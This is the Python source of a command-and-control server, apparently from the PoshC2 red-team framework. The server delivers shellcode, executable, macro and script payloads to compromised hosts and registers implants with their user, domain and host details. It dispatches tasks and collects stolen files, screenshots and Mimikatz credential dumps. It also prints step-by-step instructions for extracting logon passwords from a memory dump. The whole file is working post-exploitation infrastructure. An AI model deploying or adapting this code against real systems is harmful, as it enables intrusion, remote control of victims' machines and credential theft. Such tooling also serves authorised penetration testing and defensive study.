#!/usr/bin/env python3

import os, sys, datetime, time, base64, logging, signal, re, ssl, traceback, threading
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError
from urllib.parse import urlparse
from poshc2.server.Implant import Implant
from poshc2.server.Tasks import newTask
from poshc2.server.Core import decrypt, encrypt, default_response, decrypt_bytes_gzip, number_of_days, process_mimikatz
from poshc2.Colours import Colours
from poshc2.server.DB import select_item, get_implants_all, update_implant_lastseen, update_task, get_cmd_from_task_id, get_c2server_all, get_sharpurls
from poshc2.server.DB import update_item, get_task_owner, get_newimplanturl, initializedb, setupserver, new_urldetails, get_baseenckey, get_c2_messages, database_connect
from poshc2.server.Payloads import Payloads
from poshc2.server.Config import PoshProjectDirectory, ServerHeader, PayloadsDirectory, HTTPResponse, DownloadsDirectory, Database, PayloadCommsHost, SocksHost
from poshc2.server.Config import QuickCommand, KillDate, DefaultSleep, DomainFrontHeader, PayloadCommsPort, urlConfig, BindIP, BindPort, ReportsDirectory
from poshc2.server.Config import DownloadURI, Sounds, ClockworkSMS_APIKEY, ClockworkSMS_MobileNumbers, URLS, SocksURLS, Insecure, UserAgent, Referrer, Pushover_APIToken
from poshc2.server.Config import Pushover_APIUser, EnableNotifications
from poshc2.server.Cert import create_self_signed_cert
from poshc2.client.Help import logopic
from poshc2.Utils import validate_sleep_time, randomuri, gen_key

from socketserver import ThreadingMixIn

from http.server import BaseHTTPRequestHandler, HTTPServer


KEY = None


class MyHandler(BaseHTTPRequestHandler):

    def signal_handler(self, signal, frame):
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    def log_message(self, format, *args):
        try:
            useragent = str(self.headers['user-agent'])
        except Exception:
            useragent = "None"

        open("%swebserver.log" % PoshProjectDirectory, "a").write("%s - [%s] %s %s\n" %
                                                     (self.address_string(), self.log_date_time_string(), format % args, useragent))

    def do_HEAD(self):
        """Respond to a HEAD request."""
        self.server_version = ServerHeader
        self.sys_version = ""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_OPTIONS(self):
        """Respond to a HEAD request."""
        self.server_version = ServerHeader
        self.sys_version = ""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_PUT(self):
        """Respond to a PUT request."""
        self.server_version = ServerHeader
        self.sys_version = ""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_GET(self):
        """Respond to a GET request."""
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        new_implant_url = get_newimplanturl()
        self.cookieHeader = self.headers.get('Cookie')
        QuickCommandURI = select_item("QuickCommand", "C2Server")
        UriPath = str(self.path)
        sharpurls = get_sharpurls().split(",")
        sharplist = []
        for i in sharpurls:
            i = i.replace(" ", "")
            i = i.replace("\"", "")
            sharplist.append("/" + i)

        self.server_version = ServerHeader
        self.sys_version = ""
        if not self.cookieHeader:
            self.cookieHeader = "NONE"

        # implant gets a new task
        new_task = newTask(self.path)

        if new_task:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(new_task)

        elif [ele for ele in sharplist if(ele in UriPath)]:
            try:
                open("%swebserver.log" % PoshProjectDirectory, "a").write("%s - [%s] Making GET connection to SharpSocks %s%s\r\n" % (self.address_string(), self.log_date_time_string(), SocksHost, UriPath))
                r = Request("%s%s" % (SocksHost, UriPath), headers={'Accept-Encoding': 'gzip', 'Cookie': '%s' % self.cookieHeader, 'User-Agent': UserAgent})
                res = urlopen(r)
                sharpout = res.read()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.send_header("Connection", "close")
                self.send_header("Content-Length", len(sharpout))
                self.end_headers()
                if (len(sharpout) > 0):
                    self.wfile.write(sharpout)
            except HTTPError as e:
                self.send_response(e.code)
                self.send_header("Content-type", "text/html")
                self.send_header("Connection", "close")
                self.end_headers()
                open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
            except Exception as e:
                open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s \r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
                print(Colours.RED + "Error with SharpSocks or old implant connection - is SharpSocks running" + Colours.END)
                print(Colours.RED + UriPath + Colours.END)
                self.send_response(404)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(bytes(HTTPResponse, "utf-8"))

        elif ("%s_bs" % QuickCommandURI) in self.path:
            filename = "%spayload.bat" % (PayloadsDirectory)
            with open(filename, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(content)

        elif ("%s_rg" % QuickCommandURI) in self.path:
            filename = "%srg_sct.xml" % (PayloadsDirectory)
            with open(filename, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(content)

        elif ("%ss/86/portal" % QuickCommandURI) in self.path:
            filename = "%sSharp_v4_x86_Shellcode.bin" % (PayloadsDirectory)
            with open(filename, 'rb') as f:
                content = f.read()
            content = base64.b64encode(content)
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(content)

        elif ("%ss/64/portal" % QuickCommandURI) in self.path:
            filename = "%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory)
            with open(filename, 'rb') as f:
                content = f.read()
            content = base64.b64encode(content)
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(content)

        elif ("%sp/86/portal" % QuickCommandURI) in self.path:
            filename = "%sPosh_v4_x86_Shellcode.bin" % (PayloadsDirectory)
            with open(filename, 'rb') as f:
                content = f.read()
            content = base64.b64encode(content)
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(content)

        elif ("%sp/64/portal" % QuickCommandURI) in self.path:
            filename = "%sPosh_v4_x64_Shellcode.bin" % (PayloadsDirectory)
            with open(filename, 'rb') as f:
                content = f.read()
            content = base64.b64encode(content)
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(content)

        elif ("%s_cs" % QuickCommandURI) in self.path:
            filename = "%scs_sct.xml" % (PayloadsDirectory)
            with open(filename, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(content)

        elif ("%s_py" % QuickCommandURI) in self.path:
            filename = "%saes.py" % (PayloadsDirectory)
            with open(filename, 'rb') as f:
                content = f.read()
                content = "a" + "".join("{:02x}".format(c) for c in content)
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(bytes(content, "utf-8"))

        elif ("%s_ex86" % QuickCommandURI) in self.path:
            filename = "%sPosh32.exe" % (PayloadsDirectory)
            with open(filename, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-type", "application/x-msdownload")
            self.end_headers()
            self.wfile.write(content)

        elif ("%s_ex64" % QuickCommandURI) in self.path:
            filename = "%sPosh64.exe" % (PayloadsDirectory)
            with open(filename, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-type", "application/x-msdownload")
            self.end_headers()
            self.wfile.write(content)

        # register new implant
        elif new_implant_url in self.path and self.cookieHeader.startswith("SessionID"):
            implant_type = "PS"
            if self.path == ("%s?p" % new_implant_url):
                implant_type = "PS Proxy"
            if self.path == ("%s?d" % new_implant_url):
                implant_type = "PS Daisy"
            if self.path == ("%s?m" % new_implant_url):
                implant_type = "Python"
            if self.path == ("%s?d?m" % new_implant_url):
                implant_type = "Python Daisy"
            if self.path == ("%s?p?m" % new_implant_url):
                implant_type = "Python Proxy"
            if self.path == ("%s?c" % new_implant_url):
                implant_type = "C#"
            if self.path == ("%s?d?c" % new_implant_url):
                implant_type = "C# Daisy"
            if self.path == ("%s?p?c" % new_implant_url):
                implant_type = "C# Proxy"

            if implant_type.startswith("C#"):
                cookieVal = (self.cookieHeader).replace("SessionID=", "")
                decCookie = decrypt(KEY, cookieVal)
                IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
                Domain, User, Hostname, Arch, PID, Proxy = decCookie.split(";")
                Proxy = Proxy.replace("\x00", "")
                if "\\" in User:
                    User = User[User.index("\\") + 1:]
                newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
                newImplant.save()
                newImplant.display()
                newImplant.autoruns()
                responseVal = encrypt(KEY, newImplant.SharpCore)
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(responseVal)

            elif implant_type.startswith("Python"):
                cookieVal = (self.cookieHeader).replace("SessionID=", "")
                decCookie = decrypt(KEY, cookieVal)
                IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
                User, Domain, Hostname, Arch, PID, Proxy = decCookie.split(";")
                Proxy = Proxy.replace("\x00", "")
                newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
                newImplant.save()
                newImplant.display()
                responseVal = encrypt(KEY, newImplant.PythonCore)

                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(responseVal)
            else:
                try:
                    cookieVal = (self.cookieHeader).replace("SessionID=", "")
                    decCookie = decrypt(KEY.encode("utf-8"), cookieVal)
                    decCookie = str(decCookie)
                    Domain, User, Hostname, Arch, PID, Proxy = decCookie.split(";")
                    Proxy = Proxy.replace("\x00", "")
                    IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
                    if "\\" in str(User):
                        User = User[str(User).index('\\') + 1:]
                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
                    newImplant.save()
                    newImplant.display()
                    newImplant.autoruns()
                    responseVal = encrypt(KEY, newImplant.PSCore)
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(responseVal)
                except Exception as e:
                    print("Decryption error: %s" % e)
                    traceback.print_exc()
                    self.send_response(404)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(bytes(HTTPResponse, "utf-8"))
        else:
            self.send_response(404)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            HTTPResponsePage = select_item("HTTPResponse", "C2Server")
            if HTTPResponsePage:
                self.wfile.write(bytes(HTTPResponsePage, "utf-8"))
            else:
                self.wfile.write(bytes(HTTPResponse, "utf-8"))

    def do_POST(self):
        """Respond to a POST request."""
        try:
            self.server_version = ServerHeader
            self.sys_version = ""
            try:
                content_length = int(self.headers['Content-Length'])
            except:
                content_length = 0
            self.cookieHeader = self.headers.get('Cookie')
            try:
                cookieVal = (self.cookieHeader).replace("SessionID=", "")
            except:
                cookieVal = ""
            post_data = self.rfile.read(content_length)
            logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(self.path), str(self.headers), post_data)
            now = datetime.datetime.now()
            result = get_implants_all()
            for i in result:
                implantID = i[0]
                RandomURI = i[1]
                Hostname = i[3]
                encKey = i[5]
                Domain = i[11]
                User = i[2]
                if RandomURI in self.path and cookieVal:
                    update_implant_lastseen(now.strftime("%d/%m/%Y %H:%M:%S"), RandomURI)
                    decCookie = decrypt(encKey, cookieVal)
                    rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
                    if decCookie.startswith("Error"):
                        print(Colours.RED)
                        print("The multicmd errored: ")
                        print(rawoutput)
                        print(Colours.GREEN)
                        return
                    taskId = str(int(decCookie.strip('\x00')))
                    taskIdStr = "0" * (5 - len(str(taskId))) + str(taskId)
                    executedCmd = get_cmd_from_task_id(taskId)
                    task_owner = get_task_owner(taskId)
                    print(Colours.GREEN)
                    if task_owner is not None:
                        print("Task %s (%s) returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, task_owner, implantID, Domain, User, Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
                    else:
                        print("Task %s returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, implantID, Domain, User, Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
                    try:
                        outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
                        outputParsed = outputParsed.rstrip()
                    except Exception:
                        pass

                    if "loadmodule" in executedCmd:
                        print("Module loaded successfully")
                        update_task(taskId, "Module loaded successfully")
                    elif "get-screenshot" in executedCmd.lower():
                        try:
                            decoded = base64.b64decode(outputParsed)
                            filename = i[3] + "-" + now.strftime("%m%d%Y%H%M%S_" + randomuri())
                            output_file = open('%s%s.png' % (DownloadsDirectory, filename), 'wb')
                            print("Screenshot captured: %s%s.png" % (DownloadsDirectory, filename))
                            update_task(taskId, "Screenshot captured: %s%s.png" % (DownloadsDirectory, filename))
                            output_file.write(decoded)
                            output_file.close()
                        except Exception:
                            update_task(taskId, "Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
                            print("Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
                    elif (executedCmd.lower().startswith("$shellcode64")) or (executedCmd.lower().startswith("$shellcode64")):
                        update_task(taskId, "Upload shellcode complete")
                        print("Upload shellcode complete")
                    elif (executedCmd.lower().startswith("run-exe core.program core inject-shellcode")):
                        update_task(taskId, "Upload shellcode complete")
                        print(outputParsed)
                    elif "download-file" in executedCmd.lower():
                        try:
                            filename = executedCmd.lower().replace("download-files ", "")
                            filename = filename.replace("download-file ", "")
                            filename = filename.replace("-source ", "")
                            filename = filename.replace("..", "")
                            filename = filename.replace("'", "")
                            filename = filename.replace('"', "")
                            filename = filename.replace("\\", "/")
                            directory, filename = filename.rsplit('/', 1)
                            filename = filename.rstrip('\x00')
                            original_filename = filename.strip()

                            if not original_filename:
                                directory = directory.rstrip('\x00')
                                directory = directory.replace("/", "_").replace("\\", "_").strip()
                                original_filename = directory

                            try:
                                if rawoutput.startswith("Error"):
                                    print("Error downloading file: ")
                                    print(rawoutput)
                                    break
                                chunkNumber = rawoutput[:5]
                                totalChunks = rawoutput[5:10]
                            except Exception:
                                chunkNumber = rawoutput[:5].decode("utf-8")
                                totalChunks = rawoutput[5:10].decode("utf-8")

                            if (chunkNumber == "00001") and os.path.isfile('%s%s' % (DownloadsDirectory, filename)):
                                counter = 1
                                while(os.path.isfile('%s%s' % (DownloadsDirectory, filename))):
                                    if '.' in filename:
                                        filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
                                    else:
                                        filename = original_filename + '-' + str(counter)
                                    counter += 1
                            if (chunkNumber != "00001"):
                                counter = 1
                                if not os.path.isfile('%s%s' % (DownloadsDirectory, filename)):
                                    print("Error trying to download part of a file to a file that does not exist: %s" % filename)
                                while(os.path.isfile('%x%s' % (DownloadsDirectory, filename))):
                                    # First find the 'next' file would be downloaded to
                                    if '.' in filename:
                                        filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
                                    else:
                                        filename = original_filename + '-' + str(counter)
                                    counter += 1
                                if counter != 2:
                                    # Then actually set the filename to this file - 1 unless it's the first one and exists without a counter
                                    if '.' in filename:
                                        filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter - 1) + original_filename[original_filename.rfind('.'):]
                                    else:
                                        filename = original_filename + '-' + str(counter - 1)
                                else:
                                    filename = original_filename
                            print("Download file part %s of %s to: %s" % (chunkNumber, totalChunks, filename))
                            update_task(taskId, "Download file part %s of %s to: %s" % (chunkNumber, totalChunks, filename))
                            output_file = open('%s%s' % (DownloadsDirectory, filename), 'ab')
                            try:
                                output_file.write(rawoutput[10:])
                            except Exception:
                                output_file.write(rawoutput[10:].encode("utf-8"))
                            output_file.close()
                        except Exception as e:
                            update_task(taskId, "Error downloading file %s " % e)
                            print("Error downloading file %s " % e)
                            traceback.print_exc()

                    elif "safetydump" in executedCmd.lower():
                        rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
                        if rawoutput.startswith("[-]") or rawoutput.startswith("ErrorCmd"):
                            update_task(taskId, rawoutput)
                            print(rawoutput)
                        else:
                            dumpname = "SafetyDump-Task-%s.b64" % taskIdStr
                            dumppath = "%s%s" % (DownloadsDirectory, dumpname)
                            open(dumppath, 'w').write(rawoutput)
                            message = "Dump written to: %s" % dumppath
                            message = message + "\n The base64 blob needs decoding on Windows and then Mimikatz can be run against it."
                            message = message + "\n E.g:"
                            message = message + "\n     $filename = '.\\%s'" % dumpname
                            message = message + "\n     $b64 = Get-Content $filename"
                            message = message + "\n     $bytes = [System.Convert]::FromBase64String($b64)"
                            message = message + "\n     [io.file]::WriteAllBytes(((Get-Item -Path \".\\\").FullName) + 'safetydump.dmp', $bytes)"
                            message = message + "\n     ./mimikatz.exe"
                            message = message + "\n     sekurlsa::minidump safetydump.dmp"
                            message = message + "\n     sekurlsa::logonpasswords"
                            update_task(taskId, message)
                            print(message)

                    elif (executedCmd.lower().startswith("run-exe safetykatz") or executedCmd.lower().startswith("invoke-mimikatz") or executedCmd.lower().startswith("pbind-command")) and "logonpasswords" in outputParsed.lower():
                        print("Parsing Mimikatz Output")
                        process_mimikatz(outputParsed)
                        update_task(taskId, outputParsed)
                        print(Colours.GREEN)
                        print(outputParsed + Colours.END)

                    else:
                        update_task(taskId, outputParsed)
                        print(Colours.GREEN)
                        print(outputParsed + Colours.END)

        except Exception as e:
            print(Colours.RED + "Unknown error!" + Colours.END)
            print(e)
            traceback.print_exc()

        finally:
            try:
                UriPath = str(self.path)
                sharpurls = get_sharpurls().split(",")
                sharplist = []
                for i in sharpurls:
                    i = i.replace(" ", "")
                    i = i.replace("\"", "")
                    sharplist.append("/" + i)

                if [ele for ele in sharplist if(ele in UriPath)]:
                    try:
                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[+] Making POST connection to SharpSocks %s%s\r\n" % (SocksHost, UriPath))
                        r = Request("%s%s" % (SocksHost, UriPath), headers={'Cookie': '%s' % self.cookieHeader, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36'})
                        res = urlopen(r, post_data)
                        sharpout = res.read()
                        self.send_response(res.getcode())
                        self.send_header("Content-type", "text/html")
                        self.send_header("Content-Length", len(sharpout))
                        self.end_headers()
                        if (len(sharpout) > 0):
                            self.wfile.write(sharpout)
                    except URLError as e:
                        try:
                            self.send_response(res.getcode())
                        except:
                            self.send_response(500)
                        self.send_header("Content-type", "text/html")
                        try:
                            self.send_header("Content-Length", len(sharpout))
                        except:
                            self.send_header("Content-Length", 0)
                        self.end_headers()
                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] URLError with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
                    except Exception as e:
                        self.send_response(res.getcode())
                        self.send_header("Content-type", "text/html")
                        self.send_header("Content-Length", len(sharpout))
                        self.end_headers()
                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
                        print(Colours.RED + "Error with SharpSocks or old implant connection - is SharpSocks running" + Colours.END)
                        print(Colours.RED + UriPath + Colours.END)
                        self.send_response(404)
                        self.send_header("Content-type", "text/html")
                        self.end_headers()
                        self.wfile.write(bytes(HTTPResponse, "utf-8"))
                else:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(default_response())
            except Exception as e:
                print(Colours.RED + "Generic error in POST request!" + Colours.END)
                print(Colours.RED + UriPath + Colours.END)
                print(e)
                traceback.print_exc()


ThreadingMixIn.daemon_threads = True


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


def log_c2_messages():
    while True:
        messages = get_c2_messages()
        if messages is not None:
            for message in messages:
                print(message)
        time.sleep(2)

def main(args):
    httpd = ThreadedHTTPServer((BindIP, BindPort), MyHandler)

    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except Exception:
        print("cls")
    print(chr(27) + "[2J")
    print(Colours.GREEN + logopic)
    print(Colours.END + "")

    if os.path.isfile(Database):
        print(("Using existing project: %s" % PoshProjectDirectory) + Colours.GREEN)
        database_connect()
        C2 = get_c2server_all()
        if ((C2[1] == PayloadCommsHost) and (C2[3] == DomainFrontHeader)):
            qstart = "%squickstart.txt" % (PoshProjectDirectory)
            if os.path.exists(qstart):
                with open(qstart, 'r') as f:
                    print(f.read())
        else:
            print("Error: different IP so regenerating payloads")
            if os.path.exists("%spayloads_old" % PoshProjectDirectory):
                import shutil
                shutil.rmtree("%spayloads_old" % PoshProjectDirectory)
            os.rename(PayloadsDirectory, "%s:_old" % PoshProjectDirectory)
            os.makedirs(PayloadsDirectory)
            C2 = get_c2server_all()
            newPayload = Payloads(C2[5], C2[2], PayloadCommsHost, DomainFrontHeader, C2[8], C2[12],
                                  C2[13], C2[11], "", "", C2[19], C2[20], C2[21], get_newimplanturl(), PayloadsDirectory)
            new_urldetails("updated_host", PayloadCommsHost, C2[3], "", "", "", "")
            update_item("PayloadCommsHost", "C2Server", PayloadCommsHost)
            update_item("QuickCommand", "C2Server", QuickCommand)
            update_item("DomainFrontHeader", "C2Server", DomainFrontHeader)
            newPayload.CreateRaw()
            newPayload.CreateDlls()
            newPayload.CreateShellcode()
            newPayload.CreateSCT()
            newPayload.CreateHTA()
            newPayload.CreateCS()
            newPayload.CreateMacro()
            newPayload.CreateEXE()
            newPayload.CreateMsbuild()
            newPayload.CreatePython()
            newPayload.WriteQuickstart(PoshProjectDirectory + 'quickstart.txt')

    else:
        print("Initializing new project folder and database" + Colours.GREEN)
        print("")
        directory = os.path.dirname(PoshProjectDirectory)
        if not os.path.exists(PoshProjectDirectory): os.makedirs(PoshProjectDirectory)
        if not os.path.exists(DownloadsDirectory): os.makedirs(DownloadsDirectory)
        if not os.path.exists(ReportsDirectory): os.makedirs(ReportsDirectory)
        if not os.path.exists(PayloadsDirectory): os.makedirs(PayloadsDirectory)
        initializedb()
        if not validate_sleep_time(DefaultSleep):
            print(Colours.RED)
            print("Invalid DefaultSleep in config, please specify a time such as 50s, 10m or 1h")
            print(Colours.GREEN)
            sys.exit(1)
        setupserver(PayloadCommsHost, gen_key().decode("utf-8"), DomainFrontHeader, DefaultSleep, KillDate, HTTPResponse, PoshProjectDirectory, PayloadCommsPort, QuickCommand, DownloadURI, "", "", "", Sounds, ClockworkSMS_APIKEY, ClockworkSMS_MobileNumbers, URLS, SocksURLS, Insecure, UserAgent, Referrer, Pushover_APIToken, Pushover_APIUser, EnableNotifications)
        rewriteFile = "%s/rewrite-rules.txt" % directory
        print("Creating Rewrite Rules in: " + rewriteFile)
        print("")
        rewriteHeader = ["RewriteEngine On", "SSLProxyEngine On", "SSLProxyCheckPeerCN Off", "SSLProxyVerify none", "SSLProxyCheckPeerName off", "SSLProxyCheckPeerExpire off", "# Change IPs to point at C2 infrastructure below", "Define PoshC2 10.0.0.1", "Define SharpSocks 10.0.0.1"]
        rewriteFileContents = rewriteHeader + urlConfig.fetchRewriteRules() + urlConfig.fetchSocksRewriteRules()
        with open(rewriteFile, 'w') as outFile:
            for line in rewriteFileContents:
                outFile.write(line)
                outFile.write('\n')
            outFile.close()

        C2 = get_c2server_all()
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
                              C2[13], C2[11], "", "", C2[19], C2[20],
                              C2[21], get_newimplanturl(), PayloadsDirectory)

        new_urldetails("default", C2[1], C2[3], "", "", "", "")
        newPayload.CreateRaw()
        newPayload.CreateDlls()
        newPayload.CreateShellcode()
        newPayload.CreateSCT()
        newPayload.CreateHTA()
        newPayload.CreateCS()
        newPayload.CreateMacro()
        newPayload.CreateEXE()
        newPayload.CreateMsbuild()

        create_self_signed_cert(PoshProjectDirectory)
        newPayload.CreatePython()
        newPayload.WriteQuickstart(directory + '/quickstart.txt')

    print("")
    print("CONNECT URL: " + select_item("PayloadCommsHost", "C2Server") + get_newimplanturl() + Colours.GREEN)
    print("WEBSERVER Log: %swebserver.log" % PoshProjectDirectory)
    global KEY
    KEY = get_baseenckey()
    print("")
    print(time.asctime() + " PoshC2 Server Started - %s:%s" % (BindIP, BindPort))
    from datetime import date, datetime
    killdate = datetime.strptime(C2[5], '%d/%m/%Y').date()
    datedifference = number_of_days(date.today(), killdate)
    if datedifference < 8:
        print (Colours.RED+("\nKill Date is - %s - expires in %s days" % (C2[5],datedifference)))
    else:
        print (Colours.GREEN+("\nKill Date is - %s - expires in %s days" % (C2[5],datedifference)))
    print(Colours.END)

    protocol = urlparse(PayloadCommsHost).scheme

    if protocol == 'https':
        if (os.path.isfile("%sposh.crt" % PoshProjectDirectory)) and (os.path.isfile("%sposh.key" % PoshProjectDirectory)):
            try:
                httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="%sposh.key" % PoshProjectDirectory, certfile="%sposh.crt" % PoshProjectDirectory, server_side=True, ssl_version=ssl.PROTOCOL_TLS)
            except Exception:
                httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="%sposh.key" % PoshProjectDirectory, certfile="%sposh.crt" % PoshProjectDirectory, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
        else:
            raise ValueError("Cannot find the certificate files")

    c2_message_thread = threading.Thread(target=log_c2_messages, daemon=True)
    c2_message_thread.start()

    try:
        httpd.serve_forever()
    except (KeyboardInterrupt, EOFError):
        httpd.server_close()
        print(time.asctime() + " PoshC2 Server Stopped - %s:%s" % (BindIP, BindPort))
        sys.exit(0)


if __name__ == '__main__':
    args = sys.argv
    main(args)